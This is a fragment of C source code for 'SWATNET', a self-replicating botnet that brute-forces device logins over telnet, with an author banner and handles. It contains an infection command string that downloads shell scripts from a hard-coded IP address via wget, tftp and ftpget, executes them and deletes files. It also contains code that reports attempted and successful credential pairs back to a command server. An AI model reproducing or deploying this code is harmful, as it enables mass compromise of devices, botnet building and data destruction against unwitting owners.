/*
		  ~SWATNET SELF REP BOT~
			Made by: Cumfort
			IG: @nsaiphones
			Skype: You find it ;) 
		    LEAK THIS AND ILL MAKE YOU LEAVE THE INTERNET!
   SSSS
   S
   S
   SSSS W     W     W   AA    TTT    N     N  E-----  TTT
      S  W   W W   W   A  A    T    N N   N   E~~~~~   T
      S   W W   W W   A AA A   T   N   N N    E~~~~~   T
   SSSS    W     W   A      A  T  N     N     E-----   T
...
char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.232.48/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 45.32.232.48 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.32.232.48; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.32.232.48 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
                        ...
                        case 4:
                                {
                                        ...
                                        {
												sockprintf(mainCommSock, "[SWATNET] \x1b[34mATTEMPT \x1b[37m-> %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
			...
			case 8:
				{
                    ...
                    sockprintf(mainCommSock, "[SWATNET] \x1b[32mEXECUTED \x1b[37m-> %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
					
					if(fds[i].totalTimeout + 8 < time(NULL)) {
						sockprintf(mainCommSock, "[SWATNET] \x1b[31mUNSUCCESSFUL \x1b[37m-> %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
